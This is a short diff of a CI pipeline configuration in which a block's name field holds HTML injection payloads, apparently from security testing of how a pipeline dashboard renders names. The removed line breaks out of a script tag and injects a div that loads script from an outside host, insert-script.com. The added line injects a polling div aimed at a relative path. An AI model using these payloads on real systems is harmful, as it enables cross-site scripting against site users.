@@ -5,7 +5,7 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: 'Block #111"></script><div data-poll-background=poll data-poll-href=//insert-script.com/test.js></div>'
+  - name: "<div data-poll-state='poll'  data-poll-href='/aaaaaaaaa'  data-poll-param-from='' data-poll-param-to=''  data-poll-param-page_token='' data-poll-param-direction='' data-poll-param-requester='true'>"
     task:
       jobs:
         - name: 'Job #1'
